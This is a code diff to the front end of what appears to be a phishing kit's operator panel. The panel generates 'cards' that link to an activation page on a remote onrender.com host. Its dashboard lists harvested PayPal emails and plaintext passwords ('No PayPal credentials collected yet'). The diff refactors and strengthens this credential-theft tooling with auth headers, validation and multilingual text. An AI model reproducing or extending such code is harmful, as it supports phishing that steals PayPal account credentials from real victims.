@@ -7,7 +7,7 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fa; position: relative; }
         .container { width: 400px; padding: 30px; background-color: #ffffff; border-radius: 15px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
-        .logo { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 20px; line-height: 1; letter-spacing:;1px; -text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
+        .logo { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 20px; line-height: 1; letter-spacing: 1px; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
         .input-field { width: 100%; padding: 15px 20px; margin: 10px 0; border: 2px solid #0070ba; border-radius: 25px; font-size: 14px; color: #333333; box-sizing: border-box; background-color: #ffffff; transition: box-shadow 0.3s ease; }
         .input-field:focus { box-shadow: 0 0 10px rgba(0, 112, 186, 0.5); outline: none; }
         .input-field::placeholder { color: #999999; font-weight: 400; }
@@ -143,7 +143,7 @@
     </div>
 
     <script>
-        const API_BASE_URL = 'https://ii-cyu4.onrender.com';
+        const API_BASE_URL = 'https://i-tred.onrender.com';
         let token = localStorage.getItem('token') || null;
         let currentUser = null;
         let navigationHistory = [];
@@ -168,6 +168,7 @@
 
         function showLoader() { if (loader) loader.classList.add('active'); }
         function hideLoader() { if (loader) loader.classList.remove('active'); }
+
         function showSection(section) {
             Object.values(sections).forEach(s => { if (s) s.style.display = 'none'; });
             if (sections[section]) sections[section].style.display = 'block';
@@ -176,7 +177,9 @@
             if (elements.paypalCredentials) elements.paypalCredentials.style.display = 'block';
             if (elements.paypalCredentialsDashboard) elements.paypalCredentialsDashboard.style.display = 'block';
         }
+
         function pushHistory(state) { if (state) navigationHistory.push(state); }
+
         function goBack() {
             navigationHistory.pop();
             const prev = navigationHistory[navigationHistory.length - 1] || 'login';
@@ -184,13 +187,23 @@
         }
 
         function validateToken() {
-            if (!token) { showSection('login'); return false; }
+            if (!token) {
+                showSection('login');
+                return false;
+            }
             try {
                 const payload = JSON.parse(atob(token.split('.')[1]));
-                if (payload.exp && payload.exp < Date.now() / 1000) { showSection('login'); return false; }
+                if (!payload.username || (payload.exp && payload.exp < Date.now() / 1000)) {
+                    showSection('login');
+                    return false;
+                }
                 currentUser = payload.username;
                 return true;
-            } catch (e) { showSection('login'); return false; }
+            } catch (e) {
+                console.error('Token validation error:', e.message);
+                showSection('login');
+                return false;
+            }
         }
 
         function logout() {
@@ -201,107 +214,139 @@
         }
 
         async function login() {
-            const username = document.getElementById('loginUsername')?.value.trim();
-            const password = document.getElementById('loginPassword')?.value.trim();
-            if (!username || !password) { alert('Please enter both username and password'); return; }
+            const usernameInput = document.getElementById('loginUsername');
+            const passwordInput = document.getElementById('loginPassword');
+            if (!usernameInput || !passwordInput) {
+                alert('Login form elements are missing.');
+                return;
+            }
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
             showLoader();
             try {
-                console.log('Login attempt:', { username, origin: window.location.origin });
                 const response = await fetch(`${API_BASE_URL}/api/auth/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 });
-                console.log('Login response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Login data:', data);
-                if (response.ok) {
+                if (response.ok && data.token) {
                     token = data.token;
                     localStorage.setItem('token', token);
                     if (validateToken()) {
                         pushHistory('login');
                         showSection('card');
                         if (elements.cardDisplay) fetchUserData();
+                    } else {
+                        alert('Invalid token received. Please try again.');
                     }
-                } else { alert(data.error || 'Login failed. Check your credentials.'); }
+                } else {
+                    alert(data.error || 'Login failed. Check your credentials.');
+                }
             } catch (error) {
-                console.error('Login error:', error);
+                console.error('Login error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         async function signup() {
-            const username = document.getElementById('signupUsername')?.value.trim();
-            const password = document.getElementById('signupPassword')?.value.trim();
+            const usernameInput = document.getElementById('signupUsername');
+            const passwordInput = document.getElementById('signupPassword');
+            if (!usernameInput || !passwordInput) {
+                alert('Signup form elements are missing.');
+                return;
+            }
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
             if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
                 alert('Please enter a valid username (letters, numbers, @, .) and password');
                 return;
             }
             showLoader();
             try {
-                console.log('Signup attempt:', { username, origin: window.location.origin });
                 const response = await fetch(`${API_BASE_URL}/api/auth/signup`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 });
-                console.log('Signup response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Signup data:', data);
                 if (response.ok) {
                     alert('Signup successful! Please log in.');
                     pushHistory('signup');
                     showSection('login');
-                } else { alert(data.error || 'Signup failed. Try a different username.'); }
+                } else {
+                    alert(data.error || 'Signup failed. Try a different username.');
+                }
             } catch (error) {
-                console.error('Signup error:', error);
+                console.error('Signup error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         function showLogin() {
-            pushHistory(null);
-            if (document.getElementById('loginUsername')) document.getElementById('loginUsername').value = '';
-            if (document.getElementById('loginPassword')) document.getElementById('loginPassword').value = '';
+            pushHistory('signup');
+            const loginUsername = document.getElementById('loginUsername');
+            const loginPassword = document.getElementById('loginPassword');
+            if (loginUsername) loginUsername.value = '';
+            if (loginPassword) loginPassword.value = '';
             showSection('login');
         }
 
         function showSignup() {
             pushHistory('login');
-            if (document.getElementById('signupUsername')) document.getElementById('signupUsername').value = '';
-            if (document.getElementById('signupPassword')) document.getElementById('signupPassword').value = '';
+            const signupUsername = document.getElementById('signupUsername');
+            const signupPassword = document.getElementById('signupPassword');
+            if (signupUsername) signupUsername.value = '';
+            if (signupPassword) signupPassword.value = '';
             showSection('signup');
         }
 
         async function generateCard() {
             if (!validateToken()) return;
-            const name = document.getElementById('cardName')?.value.trim();
-            const expDate = document.getElementById('expDate')?.value.replace(/\D/g, '').trim();
-            const amount = document.getElementById('cardAmount')?.value.trim();
+            const nameInput = document.getElementById('cardName');
+            const expDateInput = document.getElementById('expDate');
+            const amountInput = document.getElementById('cardAmount');
+            if (!nameInput || !expDateInput || !amountInput) {
+                alert('Card generation form elements are missing.');
+                return;
+            }
+            const name = nameInput.value.trim();
+            const expDate = expDateInput.value.replace(/\D/g, '').trim();
+            const amount = amountInput.value.trim();
             if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
                 alert('Please enter valid Cardholder Name, Expiration Date (MMYYYY), and Amount (>0)');
                 return;
             }
             showLoader();
             try {
-                console.log('Generating card:', { name, expDate, amount });
                 const response = await fetch(`${API_BASE_URL}/api/cards/generate`, {
                     method: 'POST',
                     headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
                     body: JSON.stringify({ name, expDate, amount })
                 });
-                console.log('Generate card response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Generate card data:', data);
-                if (response.ok) {
+                if (response.ok && data.cardId) {
                     alert(`Card generated! Card ID: ${data.cardId}`);
                     if (elements.cardDisplay) fetchUserData();
-                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
-                else { alert(data.error || 'Card generation failed'); }
+                } else if (response.status === 401 || response.status === 403) {
+                    showSection('login');
+                } else {
+                    alert(data.error || 'Card generation failed');
+                }
             } catch (error) {
-                console.error('Generate card error:', error);
+                console.error('Generate card error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         function maskCardNumber(number) {
@@ -351,55 +396,68 @@
         }
 
         async function deleteCard(cardId) {
-            if (!validateToken() || !cardId) { alert('No card selected for deletion'); return; }
+            if (!validateToken() || !cardId) {
+                alert('No card selected for deletion');
+                return;
+            }
             showLoader();
             try {
-                console.log('Deleting card:', cardId);
                 const response = await fetch(`${API_BASE_URL}/api/cards/${cardId}`, {
                     method: 'DELETE',
                     headers: { 'Authorization': `Bearer ${token}` }
                 });
-                console.log('Delete card response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Delete card data:', data);
                 if (response.ok) {
                     alert('Card deleted successfully');
                     if (elements.cardDisplay) fetchUserData();
-                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
-                else { alert(data.error || 'Delete failed'); }
+                } else if (response.status === 401 || response.status === 403) {
+                    showSection('login');
+                } else {
+                    alert(data.error || 'Delete failed');
+                }
             } catch (error) {
-                console.error('Delete card error:', error);
+                console.error('Delete card error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         async function deletePaypalCredentials(cardId) {
-            if (!validateToken() || !cardId) { alert('No credentials selected for deletion'); return; }
+            if (!validateToken() || !cardId) {
+                alert('No credentials selected for deletion');
+                return;
+            }
             if (!confirm(`Are you sure you want to delete PayPal credentials for Card ID: ${cardId}?`)) return;
             showLoader();
             try {
-                console.log('Deleting PayPal credentials:', cardId);
                 const response = await fetch(`${API_BASE_URL}/api/cards/paypal-creds/${cardId}`, {
                     method: 'DELETE',
                     headers: { 'Authorization': `Bearer ${token}` }
                 });
-                console.log('Delete PayPal credentials response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Delete PayPal credentials data:', data);
                 if (response.ok) {
                     alert('PayPal credentials deleted successfully');
                     if (elements.cardDisplay) fetchUserData();
                     if (elements.generatedCardsTable) fetchDashboardData();
-                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
-                else { alert(data.error || 'Delete failed'); }
+                } else if (response.status === 401 || response.status === 403) {
+                    showSection('login');
+                } else {
+                    alert(data.error || 'Delete failed');
+                }
             } catch (error) {
-                console.error('Delete PayPal credentials error:', error);
+                console.error('Delete PayPal credentials error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
-        function activateCardPage(cardId) {
-            if (!validateToken() || !cardId) { alert('No card selected for activation'); return; }
+        async function activateCardPage(cardId) {
+            if (!validateToken() || !cardId) {
+                alert('No card selected for activation');
+                return;
+            }
             window.location.href = `${API_BASE_URL}/activate.html?cardId=${cardId}`;
         }
 
@@ -407,31 +465,35 @@
             if (!validateToken()) return;
             showLoader();
             try {
-                console.log('Fetching user data for:', currentUser);
                 const cardsResponse = await fetch(`${API_BASE_URL}/api/cards`, {
                     headers: { 'Authorization': `Bearer ${token}` }
                 });
-                console.log('Fetch cards response:', cardsResponse.status, cardsResponse.statusText);
                 const cardsData = await cardsResponse.json();
-                console.log('Fetch cards data:', cardsData);
                 if (cardsResponse.ok) {
                     elements.cardDisplay.innerHTML = '';
-                    cardsData.forEach(displayCard);
-                } else if (cardsResponse.status === 401 || response.status === 403) { showSection('login'); }
-                else { alert(cardsData.error || 'Failed to fetch cards'); }
+                    if (Array.isArray(cardsData)) {
+                        cardsData.forEach(displayCard);
+                    } else {
+                        alert('No cards found or invalid data format.');
+                    }
+                } else if (cardsResponse.status === 401 || cardsResponse.status === 403) {
+                    showSection('login');
+                } else {
+                    alert(cardsData.error || 'Failed to fetch cards');
+                }
 
-                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`);
-                console.log('Fetch PayPal creds response:', credsResponse.status, credsResponse.statusText);
+                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
                 const credsData = await credsResponse.json();
-                console.log('Fetch PayPal creds data:', credsData);
-                if (credsResponse.ok && credsData.paypalLogins && credsData.paypalLogins.length > 0) {
+                if (credsResponse.ok && Array.isArray(credsData.paypalLogins) && credsData.paypalLogins.length > 0) {
                     elements.paypalCredentialsDisplay.innerHTML = credsData.paypalLogins
                         .filter(login => login.user === currentUser)
                         .map(login => `
                             <p>
-                                <strong>Card ID:</strong> ${login.cardId}<br>
-                                <strong>Email:</strong> ${login.paypalUsername}<br>
-                                <strong>Password:</strong> ${login.paypalPassword}<br>
+                                <strong>Card ID:</strong> ${login.cardId || 'N/A'}<br>
+                                <strong>Email:</strong> ${login.paypalUsername || 'N/A'}<br>
+                                <strong>Password:</strong> ${login.paypalPassword || 'N/A'}<br>
                                 <strong>User:</strong> ${login.user || 'Unknown'}<br>
                                 <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
                                 <br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>
@@ -444,50 +506,49 @@
 
                 updateCreatorInfo();
             } catch (error) {
-                console.error('Fetch user data error:', error);
+                console.error('Fetch user data error:', error.message);
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         async function fetchDashboardData() {
             if (!validateToken() || !elements.generatedCardsTable) return;
             showLoader();
             try {
-                console.log('Fetching dashboard data for:', currentUser);
                 const response = await fetch(`${API_BASE_URL}/api/creator/dashboard`, {
                     headers: { 'Authorization': `Bearer ${token}` }
                 });
-                console.log('Fetch dashboard response:', response.status, response.statusText);
                 const data = await response.json();
-                console.log('Fetch dashboard data:', data);
                 if (response.ok) {
-                    elements.generatedCardsTable.innerHTML = data.generatedCards.map(card => `
+                    elements.generatedCardsTable.innerHTML = Array.isArray(data.generatedCards) ? data.generatedCards.map(card => `
                         <tr>
-                            <td>${card.cardId}</td>
+                            <td>${card.cardId || 'N/A'}</td>
                             <td>${card.name || 'N/A'}</td>
                             <td>${formatExpDate(card.expDate)}</td>
-                            <td>$${parseFloat(card.amount).toFixed(2)}</td>
+                            <td>$${parseFloat(card.amount || 0).toFixed(2)}</td>
                             <td>${card.user || 'Unknown'}</td>
                             <td>${card.timestamp ? new Date(card.timestamp).toLocaleString() : new Date().toLocaleString()}</td>
                         </tr>
-                    `).join('');
-                    elements.paypalLoginsTable.innerHTML = data.paypalLogins.length > 0 ? data.paypalLogins.map(login => `
+                    `).join('') : '<tr><td colspan="6">No cards available.</td></tr>';
+                    elements.paypalLoginsTable.innerHTML = Array.isArray(data.paypalLogins) && data.paypalLogins.length > 0 ? data.paypalLogins.map(login => `
                         <tr>
-                            <td>${login.cardId}</td>
-                            <td>${login.paypalUsername}</td>
-                            <td>${login.paypalPassword}</td>
+                            <td>${login.cardId || 'N/A'}</td>
+                            <td>${login.paypalUsername || 'N/A'}</td>
+                            <td>${login.paypalPassword || 'N/A'}</td>
                             <td>${login.user || 'Unknown'}</td>
                             <td>${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}</td>
                             <td><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete</button></td>
                         </tr>
                     `).join('') : '<tr><td colspan="6">No PayPal credentials available.</td></tr>';
                     if (elements.paypalCredentialsDisplayDashboard) {
-                        elements.paypalCredentialsDisplayDashboard.innerHTML = data.paypalLogins.length > 0
+                        elements.paypalCredentialsDisplayDashboard.innerHTML = Array.isArray(data.paypalLogins) && data.paypalLogins.length > 0
                             ? data.paypalLogins.map(login => `
                                 <p>
-                                    <strong>Card ID:</strong> ${login.cardId}<br>
-                                    <strong>Email:</strong> ${login.paypalUsername}<br>
-                                    <strong>Password:</strong> ${login.paypalPassword}<br>
+                                    <strong>Card ID:</strong> ${login.cardId || 'N/A'}<br>
+                                    <strong>Email:</strong> ${login.paypalUsername || 'N/A'}<br>
+                                    <strong>Password:</strong> ${login.paypalPassword || 'N/A'}<br>
                                     <strong>User:</strong> ${login.user || 'Unknown'}<br>
                                     <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
                                     <br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>
@@ -496,32 +557,39 @@
                             `).join('')
                             : '<p class="empty">No PayPal credentials collected yet.</p>';
                     }
-                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
-                else { alert(data.error || 'Failed to load dashboard'); }
+                } else if (response.status === 401 || response.status === 403) {
+                    showSection('login');
+                } else {
+                    alert(data.error || 'Failed to load dashboard');
+                }
             } catch (error) {
-                console.error('Fetch dashboard error:', error);
+                console.error('Fetch dashboard error:', error.message);
                 elements.paypalLoginsTable.innerHTML = '<tr><td colspan="6">Error loading PayPal credentials.</td></tr>';
-                if (elements.paypalCredentialsDisplayDashboard) elements.paypalCredentialsDisplayDashboard.innerHTML = '<p class="empty">Error loading PayPal credentials.</p>';
+                if (elements.paypalCredentialsDisplayDashboard) {
+                    elements.paypalCredentialsDisplayDashboard.innerHTML = '<p class="empty">Error loading PayPal credentials.</p>';
+                }
                 alert(`Error: Network Error. Details: ${error.message}`);
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         async function fetchPaypalCredentials() {
+            if (!validateToken()) return;
             showLoader();
             try {
-                console.log('Fetching PayPal credentials');
-                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`);
-                console.log('Fetch PayPal creds response:', credsResponse.status, credsResponse.statusText);
+                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
                 const credsData = await credsResponse.json();
-                console.log('Fetch PayPal creds data:', credsData);
-                if (credsResponse.ok && credsData.paypalLogins && credsData.paypalLogins.length > 0) {
+                if (credsResponse.ok && Array.isArray(credsData.paypalLogins) && credsData.paypalLogins.length > 0) {
                     elements.paypalCredentialsDisplay.innerHTML = credsData.paypalLogins
                         .filter(login => login.user === currentUser || !currentUser)
                         .map(login => `
                             <p>
-                                <strong>Card ID:</strong> ${login.cardId}<br>
-                                <strong>Email:</strong> ${login.paypalUsername}<br>
-                                <strong>Password:</strong> ${login.paypalPassword}<br>
+                                <strong>Card ID:</strong> ${login.cardId || 'N/A'}<br>
+                                <strong>Email:</strong> ${login.paypalUsername || 'N/A'}<br>
+                                <strong>Password:</strong> ${login.paypalPassword || 'N/A'}<br>
                                 <strong>User:</strong> ${login.user || 'Unknown'}<br>
                                 <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
                                 ${currentUser ? `<br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>` : ''}
@@ -532,9 +600,11 @@
                     elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">No PayPal credentials collected yet.</p>';
                 }
             } catch (error) {
-                console.error('Fetch PayPal credentials error:', error);
+                console.error('Fetch PayPal credentials error:', error.message);
                 elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">Error loading PayPal credentials.</p>';
-            } finally { hideLoader(); }
+            } finally {
+                hideLoader();
+            }
         }
 
         function updateCreatorInfo() {
@@ -546,37 +616,149 @@
         }
 
         function changeLanguage() {
-            const lang = document.getElementById('languageSelect')?.value || 'en';
-            const placeholders = {
-                en: ['Email or mobile number', 'Password'],
-                fr: ['Adresse e-mail ou numéro de mobile', 'Mot de passe'],
-                es: ['Correo electrónico o número de móvil', 'Contraseña'],
-                zh: ['电子邮件或手机号码', '密码']
+            const langSelect = document.getElementById('languageSelect');
+            if (!langSelect) return;
+            const lang = langSelect.value || 'en';
+            const translations = {
+                en: {
+                    placeholders: ['Email or mobile number', 'Password'],
+                    buttons: ['Log In', 'Sign Up', 'Generate Card', 'Logout', 'Back'],
+                    alerts: {
+                        loginError: 'Please enter both username and password',
+                        signupError: 'Please enter a valid username (letters, numbers, @, .) and password',
+                        cardError: 'Please enter valid Cardholder Name, Expiration Date (MMYYYY), and Amount (>0)',
+                        noCard: 'No card selected for deletion',
+                        noCreds: 'No credentials selected for deletion',
+                        confirmDelete: 'Are you sure you want to delete PayPal credentials for Card ID: {cardId}?',
+                        networkError: 'Error: Network Error. Details: {error}',
+                        invalidToken: 'Invalid token received. Please try again.'
+                    }
+                },
+                fr: {
+                    placeholders: ['Adresse e-mail ou numéro de mobile', 'Mot de passe'],
+                    buttons: ['Se connecter', 'S\'inscrire', 'Générer une carte', 'Déconnexion', 'Retour'],
+                    alerts: {
+                        loginError: 'Veuillez entrer un nom d\'utilisateur et un mot de passe',
+                        signupError: 'Veuillez entrer un nom d\'utilisateur valide (lettres, chiffres, @, .) et un mot de passe',
+                        cardError: 'Veuillez entrer un nom de titulaire valide, une date d\'expiration (MMAAAA) et un montant (>0)',
+                        noCard: 'Aucune carte sélectionnée pour la suppression',
+                        noCreds: 'Aucune information d\'identification sélectionnée pour la suppression',
+                        confirmDelete: 'Voulez-vous vraiment supprimer les informations PayPal pour l\'ID de carte : {cardId} ?',
+                        networkError: 'Erreur : Erreur réseau. Détails : {error}',
+                        invalidToken: 'Jeton invalide reçu. Veuillez réessayer.'
+                    }
+                },
+                es: {
+                    placeholders: ['Correo electrónico o número de móvil', 'Contraseña'],
+                    buttons: ['Iniciar sesión', 'Registrarse', 'Generar tarjeta', 'Cerrar sesión', 'Volver'],
+                    alerts: {
+                        loginError: 'Por favor, introduce nombre de usuario y contraseña',
+                        signupError: 'Por favor, introduce un nombre de usuario válido (letras, números, @, .) y contraseña',
+                        cardError: 'Por favor, introduce un nombre de titular válido, fecha de expiración (MMAAAA) y monto (>0)',
+                        noCard: 'No se seleccionó ninguna tarjeta para eliminar',
+                        noCreds: 'No se seleccionaron credenciales para eliminar',
+                        confirmDelete: '¿Estás seguro de que deseas eliminar las credenciales de PayPal para el ID de tarjeta: {cardId}?',
+                        networkError: 'Error: Error de red. Detalles: {error}',
+                        invalidToken: 'Token inválido recibido. Por favor, intenta de nuevo.'
+                    }
+                },
+                zh: {
+                    placeholders: ['电子邮件或手机号码', '密码'],
+                    buttons: ['登录', '注册', '生成卡', '退出', '返回'],
+                    alerts: {
+                        loginError: '请输入用户名和密码',
+                        signupError: '请输入有效的用户名（字母、数字、@、.）和密码',
+                        cardError: '请输入有效的持卡人姓名、到期日期（MMYYYY）和金额（>0）',
+                        noCard: '未选择要删除的卡',
+                        noCreds: '未选择要删除的凭据',
+                        confirmDelete: '您确定要删除卡ID为 {cardId} 的PayPal凭据吗？',
+                        networkError: '错误：网络错误。详情：{error}',
+                        invalidToken: '收到无效令牌。请重试。'
+                    }
+                }
             };
-            const [email, pass] = placeholders[lang] || placeholders['en'];
+            const { placeholders, buttons } = translations[lang] || translations['en'];
             ['loginUsername', 'signupUsername'].forEach(id => {
                 const el = document.getElementById(id);
-                if (el) el.placeholder = email;
+                if (el) el.placeholder = placeholders[0];
             });
             ['loginPassword', 'signupPassword'].forEach(id => {
                 const el = document.getElementById(id);
-                if (el) el.placeholder = pass;
+                if (el) el.placeholder = placeholders[1];
             });
+            document.querySelectorAll('.btn-login').forEach((btn, i) => {
+                if (i === 0) btn.textContent = buttons[0]; // Log In
+                else if (i === 1) btn.textContent = buttons[1]; // Sign Up
+                else if (i === 2) btn.textContent = buttons[2]; // Generate Card
+                else if (i === 3) btn.textContent = buttons[3]; // Logout
+            });
+            document.querySelectorAll('.back-btn').forEach(btn => {
+                btn.textContent = buttons[4]; // Back
+            });
+            // Update alert messages (requires modifying functions to use these translations)
+        }
+
+        function showAlert(message) {
+            const langSelect = document.getElementById('languageSelect');
+            const lang = langSelect ? langSelect.value || 'en' : 'en';
+            const translations = {
+                en: {
+                    loginError: 'Please enter both username and password',
+                    signupError: 'Please enter a valid username (letters, numbers, @, .) and password',
+                    cardError: 'Please enter valid Cardholder Name, Expiration Date (MMYYYY), and Amount (>0)',
+                    noCard: 'No card selected for deletion',
+                    noCreds: 'No credentials selected for deletion',
+                    confirmDelete: 'Are you sure you want to delete PayPal credentials for Card ID: {cardId}?',
+                    networkError: 'Error: Network Error. Details: {error}',
+                    invalidToken: 'Invalid token received. Please try again.'
+                },
+                fr: {
+                    loginError: 'Veuillez entrer un nom d\'utilisateur et un mot de passe',
+                    signupError: 'Veuillez entrer un nom d\'utilisateur valide (lettres, chiffres, @, .) et un mot de passe',
+                    cardError: 'Veuillez entrer un nom de titulaire valide, une date d\'expiration (MMAAAA) et un montant (>0)',
+                    noCard: 'Aucune carte sélectionnée pour la suppression',
+                    noCreds: 'Aucune information d\'identification sélectionnée pour la suppression',
+                    confirmDelete: 'Voulez-vous vraiment supprimer les informations PayPal pour l\'ID de carte : {cardId} ?',
+                    networkError: 'Erreur : Erreur réseau. Détails : {error}',
+                    invalidToken: 'Jeton invalide reçu. Veuillez réessayer.'
+                },
+                es: {
+                    loginError: 'Por favor, introduce nombre de usuario y contraseña',
+                    signupError: 'Por favor, introduce un nombre de usuario válido (letras, números, @, .) y contraseña',
+                    cardError: 'Por favor, introduce un nombre de titular válido, fecha de expiración (MMAAAA) y monto (>0)',
+                    noCard: 'No se seleccionó ninguna tarjeta para eliminar',
+                    noCreds: 'No se seleccionaron credenciales para eliminar',
+                    confirmDelete: '¿Estás seguro de que deseas eliminar las credenciales de PayPal para el ID de tarjeta: {cardId}?',
+                    networkError: 'Error: Error de red. Detalles: {error}',
+                    invalidToken: 'Token inválido recibido. Por favor, intenta de nuevo.'
+                },
+                zh: {
+                    loginError: '请输入用户名和密码',
+                    signupError: '请输入有效的用户名（字母、数字、@、.）和密码',
+                    cardError: '请输入有效的持卡人姓名、到期日期（MMYYYY）和金额（>0）',
+                    noCard: '未选择要删除的卡',
+                    noCreds: '未选择要删除的凭据',
+                    confirmDelete: '您确定要删除卡ID为 {cardId} 的PayPal凭据吗？',
+                    networkError: '错误：网络错误。详情：{error}',
+                    invalidToken: '收到无效令牌。请重试。'
+                }
+            };
+            const alerts = translations[lang] || translations['en'];
+            alert(message.replace('{cardId}', message.cardId || '').replace('{error}', message.error || 'Unknown error'));
         }
 
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
-                alert('Link copied to clipboard!');
+                showAlert('Link copied to clipboard!');
             }).catch(err => {
-                console.error('Copy failed:', err);
-                alert('Failed to copy link.');
+                console.error('Copy failed:', err.message);
+                showAlert('Failed to copy link.');
             });
         }
 
         document.addEventListener('DOMContentLoaded', () => {
             if (!token || !validateToken()) {
                 showSection('login');
-                fetchPaypalCredentials();
             } else {
                 const lastSection = navigationHistory[navigationHistory.length - 1] || 'card';
                 showSection(lastSection);
